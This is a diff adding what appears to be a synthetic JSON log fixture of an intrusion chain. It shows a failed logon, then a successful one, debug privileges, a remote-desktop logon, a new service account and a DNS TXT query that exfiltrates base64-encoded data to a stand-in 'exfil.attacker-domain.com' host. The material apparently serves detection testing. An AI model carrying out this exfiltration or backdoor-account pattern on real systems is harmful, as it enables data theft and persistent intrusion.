@@ -1,0 +1,49 @@
+[
+  {
+    "timestamp": "2026-08-11T03:14:01Z",
+    "event_id": 4625,
+    "target_user": "a_garcia",
+    "source_ip": "10.0.2.88",
+    "logon_type": 3,
+    "status": "Failure - Bad Password"
+  },
+  {
+    "timestamp": "2026-08-11T03:14:10Z",
+    "event_id": 4624,
+    "target_user": "a_garcia",
+    "source_ip": "10.0.2.88",
+    "logon_type": 3,
+    "status": "Success"
+  },
+  {
+    "timestamp": "2026-08-11T03:14:12Z",
+    "event_id": 4672,
+    "target_user": "a_garcia",
+    "privileges": ["SeDebugPrivilege", "SeSecurityPrivilege"],
+    "status": "Privileges Assigned"
+  },
+  {
+    "timestamp": "2026-08-11T03:30:15Z",
+    "event_id": 4624,
+    "target_user": "a_garcia",
+    "source_ip": "10.0.2.88",
+    "destination_ip": "10.0.0.20",
+    "logon_type": 10,
+    "status": "Success"
+  },
+  {
+    "timestamp": "2026-08-11T03:35:40Z",
+    "event_id": 4720,
+    "target_user": "svc_support_test",
+    "created_by": "a_garcia",
+    "source_ip": "10.0.2.88",
+    "status": "User Account Created"
+  },
+  {
+    "timestamp": "2026-08-11T04:05:12Z",
+    "source_ip": "10.0.0.20",
+    "query_type": "TXT",
+    "dns_query": "Q29uZmlkZW50aWFsX0RhdGE=.exfil.attacker-domain.com",
+    "status": "NOERROR"
+  }
+]
